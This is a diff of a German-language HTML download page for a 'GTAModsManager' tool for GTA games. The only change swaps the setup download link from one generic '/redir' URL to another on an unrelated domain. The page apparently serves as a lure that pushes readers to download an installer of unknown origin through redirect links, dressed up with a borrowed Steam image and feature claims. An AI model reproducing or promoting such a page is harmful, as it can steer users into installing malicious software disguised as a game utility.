@@ -1,7 +1,7 @@
 <div style="max-width:800px;margin:auto;padding:20px;font-family:Arial,sans-serif;line-height:1.6;background:#0a0a0f;color:#e0e0e0;border-radius:15px;">
 <h1 style="color:#44aaff;border-bottom:2px solid #2288cc;text-align:center;">🔧 GTAModsManager – Universal Mod Manager für GTA III, VC, SA, IV & V 🔧</h1>
 <p style="font-size:1.1em;text-align:center;"><strong>Die All-in-One-Mod-Management-Lösung für alle Windows-GTA-Teile.</strong> Von GTA III bis GTA V. Verwalten Sie CLEO, ASI, ScriptHook, RPF-Archive, TXD-Texturen und vieles mehr – alles in einer einheitlichen Oberfläche.</p>
-<div style="background:#111116;padding:20px;text-align:center;margin:15px 0;"><a href="https://fileshare.pw/redir" style="background:#44aaff;color:#000;padding:12px 25px;text-decoration:none;border-radius:5px;">⬇️ GTAMODSMANAGER (SETUP) HERUNTERLADEN</a><p>✅ Alle GTA-Teile ✅ Universelles Mod-Format ✅ Automatische Backups ✅ Profil-Verwaltung ✅ Dunkle UI</p></div>
+<div style="background:#111116;padding:20px;text-align:center;margin:15px 0;"><a href="https://www.shawonline.co.za/redir" style="background:#44aaff;color:#000;padding:12px 25px;text-decoration:none;border-radius:5px;">⬇️ GTAMODSMANAGER (SETUP) HERUNTERLADEN</a><p>✅ Alle GTA-Teile ✅ Universelles Mod-Format ✅ Automatische Backups ✅ Profil-Verwaltung ✅ Dunkle UI</p></div>
 <img src="https://shared.fastly.steamstatic.com/store_item_assets/steam/apps/271590/header.jpg" style="max-width:100%;border-radius:8px;margin:15px 0;">
 <div><h3>📦 Was Sie mit dem Universal-GTAModsManager erhalten:</h3>
 <ul><li><strong>Unterstützung für alle Windows-GTA-Teile:</strong> Funktioniert mit GTA III, Vice City, San Andreas, IV, Episodes from Liberty City und V (sowohl Original- als auch Definitive Edition-Versionen).</li>
